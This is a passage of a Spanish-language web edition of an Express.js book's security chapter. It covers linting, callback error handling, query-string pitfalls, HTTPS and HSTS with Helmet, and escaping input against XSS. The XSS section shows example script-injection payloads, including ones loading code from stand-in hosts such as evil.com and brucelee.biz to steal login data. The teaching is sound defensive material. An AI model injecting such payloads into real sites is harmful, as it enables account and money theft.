+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Summary
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#otro-tema-herramientas-de-calidad-de-codigo-por-tipo-de-archivo-en-proyectos-web" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Otro tema - Herramientas de calidad de código por tipo de archivo en proyectos web
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Otro tema - Herramientas de calidad de código por tipo de archivo en proyectos web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#resumen-ejecutivo-integrado" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Resumen ejecutivo (integrado)
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Resumen ejecutivo (integrado)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lectura-profesional-del-sistema" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Lectura profesional del sistema
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Get started
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../part1/cap1/Intro/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    EXPRESS IN ACTION
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+  
+
+
+<h1 id="security">Security<a class="headerlink" href="#security" title="Permanent link">&para;</a></h1>
+<p>Este capítulo cubre:  </p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <strong>Mantener tu código Express libre de errores, usando herramientas y pruebas.</strong>  </li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <strong>Lidiar con ataques; entender cómo funcionan y cómo evitarlos.</strong>  </li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <strong>Manejar el inevitable fallo del servidor.</strong>  </li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <strong>Auditar el código de terceros que usas en tu aplicación.</strong></li>
+</ul>
+<p>En el capítulo 8 te dije que tenía tres capítulos favoritos. El primero fue el capítulo 3, donde traté las bases de Express intentando darte una comprensión sólida del framework. El segundo favorito fue el capítulo 8, donde tus aplicaciones usaron bases de datos para volverse más reales. Bienvenido a mi último favorito: el capítulo sobre seguridad. </p>
+<p>Probablemente no tenga que decirte que la seguridad informática es importante, y que cada día lo es más. Seguro que has visto titulares de noticias sobre filtraciones de datos, ciberataques y hacktivismo. Conforme nuestro mundo se mueve cada vez más hacia la esfera digital, nuestra seguridad digital se vuelve cada vez más importante.</p>
+<p>Mantener tus aplicaciones Express seguras debería (ojalá) ser importante: ¿quién quiere ser hackeado? En este capítulo, discutiremos formas en que tus aplicaciones podrían ser vulneradas y cómo defenderte. </p>
+<p>Este capítulo no tiene un flujo tan lineal como los otros. Encontrarás que exploras un tema y luego saltas a otro, y aunque puede haber algunas similitudes, la mayoría de estos ataques son bastante distintos entre sí.</p>
+<h2 id="la-mentalidad-de-seguridad">La mentalidad de seguridad<a class="headerlink" href="#la-mentalidad-de-seguridad" title="Permanent link">&para;</a></h2>
+<p>El famoso especialista en seguridad Bruce Schneier describe algo que llama <strong>la mentalidad de seguridad</strong>:</p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>Uncle Milton Industries lleva vendiendo granjas de hormigas a niños desde 1956. Algunos años atrás, recuerdo que abrí una con un amigo. No venían hormigas en la caja. En su lugar, había una tarjeta que rellenabas con tu dirección, y la empresa te enviaba hormigas por correo. Mi amigo se sorprendió de que pudieras recibir hormigas por correo. Yo respondí: ‘Lo realmente interesante es que estas personas enviarán un tubo de hormigas vivas a cualquier persona que les digas’. </p>
+<p>La seguridad requiere una mentalidad particular. Los profesionales de la seguridad —al menos los buenos— ven el mundo de forma distinta. No pueden entrar en una tienda sin notar cómo podrían robar. No pueden usar una computadora sin preguntarse por sus vulnerabilidades de seguridad. No pueden votar sin intentar averiguar cómo votar dos veces. Simplemente no pueden evitarlo. La mentalidad de seguridad” por Bruce Schneier, en  <a href="https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html">https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html</a></p>
+</div>
+<p>Bruce Schneier no está sugiriendo que robes cosas ni que rompas la ley. Está proponiendo que la mejor forma de protegerte es pensar como un atacante: ¿cómo podría alguien subvertir un sistema? ¿Cómo podría alguien abusar de lo que se le da? Si puedes pensar como un atacante y buscar lagunas en tu propio código, entonces podrás descubrir cómo cerrar esos agujeros y hacer tu aplicación más segura.</p>
+<p>Este capítulo no puede cubrir todas y cada una de las vulnerabilidades de seguridad que existen. Entre el momento en que escribo esto y el momento en que lo lees, muy probablemente aparecerá un nuevo vector de ataque que pueda afectar a tus aplicaciones Express. Pensar como un atacante te ayudará a defender tus aplicaciones frente al interminable aluvión de posibles fallos de seguridad.</p>
+<p>El hecho de que no vaya a repasar cada vulnerabilidad de seguridad no significa que no trate las más comunes. ¡Sigue leyendo!</p>
+<h2 id="mantener-tu-codigo-lo-mas-libre-de-errores-posible">Mantener tu código lo más libre de errores posible.<a class="headerlink" href="#mantener-tu-codigo-lo-mas-libre-de-errores-posible" title="Permanent link">&para;</a></h2>
+<p>En esta etapa de tu carrera como programador, probablemente ya te has dado cuenta de que <strong>la mayoría de los bugs son malos</strong> y de que <strong>debes tomar medidas para prevenirlos</strong>. No debería sorprenderte que <strong>muchos de estos bugs puedan convertirse en vulnerabilidades de seguridad</strong>.  </p>
+<p>Por ejemplo, si cierto tipo de entrada del usuario puede hacer que tu aplicación se cuelgue o se reinicie, un atacante puede simplemente <strong>enviar un torrente de esas solicitudes</strong> a tus servidores Express y <strong>dejar el servicio fuera de servicio para todos</strong>. Definitivamente <strong>no quieres que eso pase</strong>.</p>
+<p>Existen muchos métodos para mantener tus aplicaciones Express libres de errores y, por tanto, menos susceptibles a ataques. En esta sección no voy a cubrir los principios generales para mantener tu software libre de errores, pero aquí tienes algunos que debes tener en cuenta:</p>
+<ul>
+<li><strong>Las pruebas son terriblemente importantes</strong>. Ya hablamos de pruebas en el capítulo anterior.  </li>
+<li><strong>Las revisiones de código pueden ser muy útiles</strong>. Más ojos sobre el código casi con seguridad significan menos errores.  </li>
+<li><strong>No reinventes la rueda</strong>. Si alguien ya ha creado una biblioteca que hace lo que necesitas, probablemente deberías usarla, pero asegúrate de que esté bien probada y sea confiable.  </li>
+<li><strong>Sigue buenas prácticas de programación</strong>. Veremos cuestiones específicas de Express y JavaScript, pero también debes asegurarte de que tu código tenga una buena arquitectura y esté limpio.</li>
+</ul>
+<p>En esta sección hablaremos de aspectos específicos de Express, pero los principios que acabo de mencionar son extremadamente útiles para prevenir errores y, en consecuencia, para evitar problemas de seguridad.</p>
+<h3 id="imponer-buenas-practicas-de-javascript-con-jshint">Imponer buenas prácticas de JavaScript con JSHint<a class="headerlink" href="#imponer-buenas-practicas-de-javascript-con-jshint" title="Permanent link">&para;</a></h3>
+<p>En algún momento de tu vida con JavaScript, probablemente hayas oído hablar de <em>JavaScript: The Good Parts</em> (O’Reilly Media, 2008). Si no lo has visto, es un libro famoso de Douglas Crockford, el creador (o “descubridor”, como él lo llama) de JSON. En él se define un subconjunto del lenguaje que se considera “bueno”, y se desaconseja el resto.  </p>
+<p>Por ejemplo, Crockford desaconseja usar el operador de doble igual (<code>==</code>) y recomienda usar en su lugar el operador de triple igual (<code>===</code>). El operador de doble igual realiza coerción de tipos, lo que puede complicarse y generar errores, mientras que el triple igual funciona prácticamente como uno esperaría, comparando valor y tipo sin coerción.</p>
+<p>Además, existen varias trampas bastante comunes que afectan a los desarrolladores de JavaScript y que no son necesariamente culpa del lenguaje en sí. Por mencionar algunas:  </p>
+<ul>
+<li>omitir puntos y coma,  </li>
+<li>olvidar la declaración <code>var</code> (o <code>let</code>/<code>const</code>),  </li>
+<li>escribir mal los nombres de las variables.</li>
+</ul>
+<p>Si hubiera una herramienta que <strong>hiciese cumplir un buen estilo de código</strong> y <strong>otra que te ayudase a corregir errores</strong>, ¿las usarías? ¿Y qué pasaría si solo fuese una herramienta?</p>
+<p>Me detendré antes de que tu imaginación se dispare: existe una herramienta llamada <strong>JSHint</strong> (<a href="http://jshint.com/">http://jshint.com/</a>). JSHint analiza tu código y señala lo que llama <strong>uso sospechoso</strong>. No es técnicamente incorrecto usar el operador de doble igual (<code>==</code>) o olvidar <code>var</code>, pero es probable que sea un error.</p>
+<p>Instalarás JSHint globalmente con:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>npm<span class="w"> </span>install<span class="w"> </span>jshint<span class="w"> </span>-g
+</span></code></pre></div>
+<p>Ahora, si escribes en la terminal:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>jshint<span class="w"> </span>myfile.js
+</span></code></pre></div>
+<p>JSHint revisará tu código y te avisará de cualquier uso sospechoso o de posibles bugs. </p>
+<p>Sin embargo, en el desarrollo JavaScript moderno, muchos programadores prefieren usar <strong>ESLint</strong>, una herramienta de <em>linting</em> más potente y flexible. ESLint no solo detecta posibles errores, sino que también te permite <strong>definir reglas personalizadas</strong>, <strong>imponer estándares de código en todo el equipo</strong> e incluso <strong>corregir automáticamente ciertos problemas</strong>.  </p>
+<p>Dispone de un ecosistema muy amplio de <em>plugins</em> y es muy utilizado en entornos profesionales, especialmente junto a frameworks como React y Node.js.</p>
+<p>El archivo del siguiente listado es un ejemplo de lo que podría encontrarse.</p>
+<p><img alt="" src="../filewithbug.png" title="Un archivo JavaScript con un error" /></p>
+<p>Observa que la segunda línea tiene un error: le falta un signo de igual. Si ejecutas JSHint en este archivo (con jshint myfile.js), verás el siguiente resultado:</p>
+<p><div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>myfile.js:<span class="w"> </span>line<span class="w"> </span><span class="m">2</span>,<span class="w"> </span>col<span class="w"> </span><span class="m">13</span>,<span class="w"> </span>Missing<span class="w"> </span>semicolon.
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>myfile.js:<span class="w"> </span>line<span class="w"> </span><span class="m">3</span>,<span class="w"> </span>col<span class="w"> </span><span class="m">18</span>,<span class="w"> </span>Expected<span class="w"> </span>an<span class="w"> </span>assignment<span class="w"> </span>or<span class="w"> </span><span class="k">function</span><span class="w"> </span>call<span class="w"> </span>and<span class="w"> </span>instead<span class="w"> </span>saw<span class="w"> </span>an
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span>expression.
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="m">2</span><span class="w"> </span>errors
+</span></code></pre></div>
+Si ves esto, sabrás que algo está mal. Puedes volver atrás, añadir el signo igual (o la corrección que precise tu caso) y JSHint dejará de quejarse.  </p>
+<p>En mi opinión, JSHint funciona mejor cuando está integrado en tu editor. Visita la página de descarga de JSHint en <a href="http://jshint.com/install/">http://jshint.com/install/</a> para ver la lista de integraciones con distintos editores. La figura 10.1 muestra JSHint integrado en el editor Sublime Text: ahora podrás ver los errores <strong>antes incluso de ejecutar el código</strong>.</p>
+<p><img alt="" src="../JSHintIntegration.png" title="Integración de JSHint en el editor Sublime Text. Observe el error en el lado izquierdo de la ventana y el mensaje en la parte inferior de la barra de estado." /></p>
+<p>JSHint me ha ahorrado un <em>montón</em> de tiempo al trabajar con JavaScript y ha corregido incontables bugs. Sé que algunos de esos bugs eran verdaderas fallas de seguridad.</p>
+<h3 id="detener-el-flujo-de-ejecucion-cuando-ocurren-errores-en-los-callbacks">Detener el flujo de ejecución cuando ocurren errores en los callbacks<a class="headerlink" href="#detener-el-flujo-de-ejecucion-cuando-ocurren-errores-en-los-callbacks" title="Permanent link">&para;</a></h3>
+<p>Las callbacks son una parte bastante importante de Node. Cada middleware y cada ruta en Express las utiliza, por no mencionar… bueno, casi cualquier otra cosa. Desafortunadamente, la gente comete algunos errores con las callbacks, y estos pueden crear bugs.</p>
+<p>Mira si puedes detectar el error en este código:</p>
+<div class="language-js highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="s2">&quot;myfile.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="p">});</span>
+</span></code></pre></div></td></tr></table></div>
+<p>En este código estás leyendo un archivo y mostrando su contenido con <code>console.log</code> si todo funciona bien. Pero si por alguna razón no funciona, muestras el error y luego continúas intentando mostrar los datos del archivo.</p>
+<p>Si hay un error, debes detener la ejecución. Por ejemplo:</p>
+<p><div class="language-js highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span>
+<span class="normal"><a href="#__codelineno-4-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="s2">&quot;myfile.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="nx">err</span><span class="p">;</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="p">});</span>
+</span></code></pre></div></td></tr></table></div>
+Por lo general, es importante detenerse si se produce algún tipo de error. No conviene lidiar con resultados erróneos, ya que esto puede provocar un comportamiento inestable del servidor.</p>
+<h3 id="perilous-parsing-of-query-strings">Perilous parsing of query strings<a class="headerlink" href="#perilous-parsing-of-query-strings" title="Permanent link">&para;</a></h3>
+<p>Es muy común que los sitios web tengan cadenas de consulta (query strings). Por ejemplo, casi todos los motores de búsqueda que has usado en tu vida tienen algún tipo de cadena de consulta. Una búsqueda de “crockford backflip video” podría verse algo así:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>https://search.example.com?q=crockford+backflip+video
+</span></code></pre></div>
+<p>Aquí la parte después del <code>?</code> es el <strong>query string</strong> (<code>q=crockford+backflip+video</code>), donde el parámetro <code>q</code> lleva el texto de búsqueda hacia el servidor.</p>
+<p>En Express, puedes obtener la consulta usando req.query, como se muestra en el siguiente listado.</p>
+<p><img alt="" src="../grabbingString.png" title="Obteniendo req.query (nota: ¡contiene bugs!)" /></p>
+<p>Esto está bien y es correcto, a menos que la entrada no sea exactamente como tú esperas. Por ejemplo, si un usuario visita la ruta <code>/search</code> sin un parámetro llamado <code>q</code>, entonces estarías llamando a <code>.replace</code> sobre una variable <code>undefined</code> (no definida). Esto puede causar errores.  </p>
+<p>Siempre querrás asegurarte de que tus usuarios te estén dando los datos que esperas, y si no lo hacen, tendrás que hacer algo al respecto. Una opción sencilla es proporcionar un valor por defecto, de modo que, si no se envía nada, se asuma que la consulta está vacía. Observa el siguiente listado como ejemplo.</p>
+<p><img alt="" src="../assume.png" title="No des por sentado que tus consultas existen (nota: ¡aún contiene errores!)." /></p>
+<p>Esto corrige un bug importante: si estás esperando una query string que no está ahí, no tendrás variables <code>undefined</code>. Pero hay otra trampa importante con el análisis que hace Express de las query strings: también pueden ser del tipo equivocado (aunque sigan estando definidas). Si un usuario visita <code>/search?q=abc</code>, entonces <code>req.query.q</code> será una cadena. Seguirá siendo una cadena si visita <code>/search?q=abc&amp;name=douglas</code>. Pero si especifican la variable <code>q</code> dos veces, así:</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>/search?q=abc&amp;q=xyz
+</span></code></pre></div>
+entonces <code>req.query.q</code> será el array <code>["abc", "xyz"]</code>. Ahora, si intentas llamar a <code>.replace</code> sobre él, volverá a fallar porque ese método no está definido en arrays. Oh, no.</p>
+<p>Personalmente, creo que esto es un defecto de diseño de Express. Este comportamiento debería permitirse, pero no creo que debiera estar activado por defecto. Hasta que lo cambien (y no estoy seguro de que tengan planes para hacerlo), tendrás que suponer que tus queries podrían ser arrays.</p>
+<p>Para resolver este problema (y otros parecidos), escribí el paquete <code>arraywrap</code> (disponible en <a href="https://www.npmjs.org/package/arraywrap">https://www.npmjs.org/package/arraywrap</a>). Es un módulo muy pequeño; en total son solo 19 líneas de código. Es una función que toma un solo argumento: si el argumento no es ya un array, lo envuelve en un array; si el argumento es un array, lo devuelve tal cual porque ya es un array.</p>
+<p>Puedes instalarlo con <code>npm install arraywrap --save</code> y luego puedes usarlo para convertir (forzar) todas tus query strings en arrays, como se muestra en el siguiente listado.</p>
+<p><img alt="" src="../dontasumme.png" title="No asuma que sus consultas no son matrices." /></p>
+<p>Ahora, si alguien te da más queries de las que esperas, simplemente tomas la primera y omites el resto. Esto sigue funcionando si alguien te da un solo argumento de consulta o ningún argumento de consulta. Alternativamente, podrías detectar si la consulta es un array y hacer algo diferente ahí. Esto nos lleva a un punto importante del capítulo: nunca confíes en la entrada del usuario. Supón que cada ruta será rota de alguna manera.</p>
+<h2 id="protegiendo-a-tus-usuarios">Protegiendo a tus usuarios<a class="headerlink" href="#protegiendo-a-tus-usuarios" title="Permanent link">&para;</a></h2>
+<p>Los gobiernos han tenido sus sitios web vulnerados; Twitter sufrió una especie de “virus” de tweets; se han robado información de cuentas bancarias. Incluso productos que no manejan datos particularmente sensibles pueden terminar con contraseñas filtradas: Sony y Adobe han estado envueltos en escándalos de este tipo. Si tu sitio tiene usuarios, querrás ser responsable y protegerlos. Hay varias cosas que puedes hacer para proteger a tus usuarios de daños, y las examinaremos en esta sección.</p>
+<h3 id="usando-https">Usando HTTPS<a class="headerlink" href="#usando-https" title="Permanent link">&para;</a></h3>
+<p>En resumen, usa HTTPS en lugar de HTTP. Ayuda a proteger a tus usuarios contra todo tipo de ataques. Créeme: ¡lo quieres! Hay dos piezas de middleware de Express que querrás usar con HTTPS: uno obligará a tus usuarios a usar HTTPS y el otro se asegurará de que se mantengan en él.</p>
+<p><strong>OBLIGAR A LOS USUARIOS A USAR HTTPS</strong>  </p>
+<p>El primer middleware que veremos es <code>express-enforces-ssl</code>. Como indica su nombre, aplica SSL (HTTPS). Básicamente, si la petición llega por HTTPS, continúa hacia el resto de tu middleware y rutas. Si no, redirige a la versión HTTPS. Para usar este módulo tendrás que hacer dos cosas.  </p>
+<ol>
+<li>
+<p>Activar la opción “trust proxy”. La mayoría de las veces, cuando despliegas tus aplicaciones, tu servidor no está conectado directamente al cliente. Si despliegas en la plataforma en la nube Heroku (como verás en el capítulo 11), los servidores de Heroku se sitúan entre tu servidor y el cliente. Para avisar a Express de esto, debes habilitar la configuración “trust proxy”.  </p>
+</li>
+<li>
+<p>Invocar (llamar) al middleware.</p>
+</li>
+</ol>
+<p>Asegúrate de ejecutar <code>npm install express-enforces-ssl</code>, y luego ejecuta el código del siguiente listado.</p>
+<p><img alt="" src="../httpsExpress.png" title="Implementación de HTTPS en Express" /></p>
+<p>No hay mucho más que añadir sobre este módulo, pero puedes ver más información en:<br />
+<a href="https://github.com/hengkiardo/express-enforces-ssl">https://github.com/hengkiardo/express-enforces-ssl</a>.</p>
+<p><strong>MANTENER A LOS USUARIOS EN HTTPS</strong>  </p>
+<p>Una vez que tus usuarios están en HTTPS, querrás decirles que eviten volver a HTTP. Los navegadores modernos soportan una función llamada HTTP Strict Transport Security (HSTS). Es un encabezado HTTP simple que indica a los navegadores que permanezcan en HTTPS durante un período de tiempo.</p>
+<p>Si quieres que tus usuarios permanezcan en HTTPS durante un año (aproximadamente 31.536.000 segundos), debes configurar el siguiente encabezado:</p>
+<p><img alt="" src="../strictmode.png" /></p>
+<p>También puedes habilitar el soporte para subdominios. Si eres dueño de <code>slime.biz</code>, probablemente quieras activar HSTS para <code>cool.slime.biz</code>. Para establecer este encabezado usarás Helmet (<a href="https://github.com/helmetjs/helmet">https://github.com/helmetjs/helmet</a>), un módulo que configura útiles encabezados de seguridad HTTP en tus aplicaciones Express. Como verás a lo largo del capítulo, tiene varios encabezados que puede configurar. Empezaremos con su funcionalidad HSTS.  </p>
+<p>Primero, como siempre, ejecuta <code>npm install helmet</code> en el proyecto en el que estés trabajando. También te recomiendo instalar el módulo <code>ms</code>, que convierte cadenas legibles por humanos (como <code>"2 days"</code>) en <code>172800000</code> milisegundos. Ahora puedes usar el middleware, como se muestra en el siguiente listado.</p>
+<p><img alt="" src="../helmet.png" title="Utilizando el middleware HSTS de Helmet" /></p>
+<p>Ahora, HSTS se establecerá en cada petición.  </p>
+<p><strong>¿POR QUÉ NO PUEDO USAR SOLO HSTS?</strong> </p>
+<p>Este encabezado solo es efectivo si tus usuarios ya están en HTTPS, por eso necesitas <code>express-enforces-ssl</code>.</p>
+<h3 id="prevencion-de-ataques-de-secuencias-de-comandos-entre-sitios">Prevención de ataques de secuencias de comandos entre sitios<a class="headerlink" href="#prevencion-de-ataques-de-secuencias-de-comandos-entre-sitios" title="Permanent link">&para;</a></h3>
+<p>Probablemente no debería decir esto, pero hay muchas formas en las que podrías robar mi dinero. Podrías pegarme y desvalijarme, amenazarme o sacarme la cartera del bolsillo. Si fueras un hacker, también podrías entrar en mi banco y transferir una buena parte de mi dinero hacia ti (y de todas las opciones que aparecen aquí, esta es la que más prefiero). Si lograras tener el control de mi navegador, incluso aunque no conocieras mi contraseña, todavía podrías obtener mi dinero. Podrías esperar a que yo iniciara sesión y luego tomar el control de mi navegador, mandándolo a la página de “transferir dinero” de mi banco y mover una cantidad importante. Si fueras especialmente astuto, podrías ocultar todo de forma que yo ni siquiera me diera cuenta de lo que pasó (hasta que, por supuesto, todo mi dinero hubiera desaparecido). Pero ¿cómo podrías tener el control de mi navegador? Quizá la forma más popular sería a través de un ataque de scripting entre sitios (XSS).</p>
+<p>Imagina que, en la página principal de mi banco, puedo ver una lista de mis contactos con sus nombres, como se muestra en la figura 10.2. Los usuarios tienen control sobre sus nombres. Bruce Lee puede entrar en su configuración y cambiar su nombre a Bruce Springsteen si lo desea. Pero ¿qué pasaría si cambiara su nombre a algo como esto:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Bruce Lee&lt;script&gt;transferMoney(1000000,&quot;bruce-lee’s-account&quot;);&lt;/script&gt; 
+</span></code></pre></div>
+<p>La lista de contactos seguiría apareciendo igual, pero ahora mi navegador también ejecutará el código dentro de la etiqueta <script>. Probablemente, esto transferirá un millón de dólares a la cuenta de Bruce Lee, y yo nunca me enteraré. Bruce Lee también podría añadir <script src="http://brucelee.biz/hacker.js"></script> a su nombre. Este script podría enviar datos (como información de inicio de sesión, por ejemplo) a brucelee.biz. Hay una forma importante de prevenir XSS: nunca confiar ciegamente en la información que ingrese el usuario.</p>
+<p><strong>ESCAPAR LA ENTRADA DEL USUARIO</strong></p>
+<p>Cuando se recibe entrada del usuario, casi siempre existe la posibilidad de que introduzca algo malicioso. En el ejemplo anterior, podrías configurar tu nombre para que contenga etiquetas <script>, lo que causaría problemas de XSS. Puedes sanear o escapar la entrada del usuario para que, al insertarla, no ocurra nada inesperado.</p>
+<p>Dependiendo de dónde coloques la entrada del usuario, la sanitización variará. Como principio general, conviene sanitizar la entrada tanto como sea posible y tener siempre en cuenta el contexto. Si colocas contenido del usuario dentro de etiquetas HTML, por ejemplo, debes asegurarte de que no pueda definir ninguna etiqueta HTML. Necesitarás este tipo de cadena</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Hello, &lt;script src=&quot;http://evil.com/hack.js&quot;&gt;&lt;/script&gt;world
+</span></code></pre></div>
+para convertirse en algo así:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Hello, &amp;lt;script src=&quot;http://evil.com/hack.js&quot;&amp;gt;&amp;lt;/script&amp;gt;world
+</span></code></pre></div>
+<p>Al hacer esto, las etiquetas <code>&lt;script&gt;</code> se volverán inútiles.</p>
+<p>Este tipo de escape (y otros) lo gestionan automáticamente la mayoría de los motores de plantillas. En EJS, simplemente usa la etiqueta predeterminada &lt;%= myString %&gt; y no uses <code>&lt;%- userString %&gt;.</code> En Pug, este escape se realiza por defecto. A menos que estés seguro de que no quieres sanear nada, asegúrate de usar la versión segura siempre que trabajes con cadenas de usuario.</p>
+<p>Si sabes que el usuario debe ingresar una URL, deberás hacer algo más que el escape; deberás hacer todo lo posible para validar que algo sea una URL. También deberás llamar a la función integrada encodeURI en una URL para asegurarte de que sea segura.</p>
+<p>Si colocas algo dentro de un atributo HTML (como el atributo <code>href</code> de un enlace), asegúrate de que tus usuarios no puedan insertar comillas, por ejemplo.</p>
+<p>Desafortunadamente, no existe una solución universal para sanitizar la entrada del usuario; la forma de hacerlo depende del contexto. Sin embargo, siempre debes sanitizar la entrada del usuario tanto como sea posible.</p>
+<p>También puedes escapar la entrada antes de guardarla en la base de datos. En los ejemplos anteriores, mostramos cómo sanitizar la información al mostrarla. Pero si sabes que tus usuarios deben ingresar páginas de inicio en sus perfiles, también es útil sanitizarla antes de almacenarla en la base de datos. Si ingreso "hola, mundo" como mi página de inicio, el servidor debería mostrar un error. Si ingreso <a href="http://evanhahn.com">http://evanhahn.com</a> como mi página de inicio, debería permitirse y guardarse en la base de datos. Esto puede tener beneficios de seguridad y de interfaz de usuario.</p>
+<p><strong>MITIGAR XSS CON CABEZAS HTTP</strong></p>
+<p>Existe otra forma de mitigar XSS, aunque es bastante limitada: el uso de las cabeceras HTTP. Una vez más, utilizaremos Helmet.</p>
